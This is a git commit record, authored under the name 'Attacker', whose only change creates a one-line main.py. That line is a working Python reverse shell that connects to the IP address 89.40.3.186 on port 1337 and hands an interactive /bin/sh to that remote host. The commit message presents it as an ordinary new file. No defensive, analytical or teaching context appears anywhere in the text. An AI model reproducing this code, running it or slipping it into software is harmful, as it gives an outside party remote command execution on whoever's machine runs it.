9e0da360c419f3d4577c25d348782d73e6da3937
Attacker <ujisherat@gmail.com>
2025-11-16 15:32:20 +0330

    Create main.py

---
+++ main.py
@@ -0,0 +1,1 @@
+import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("89.40.3.186",1337));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
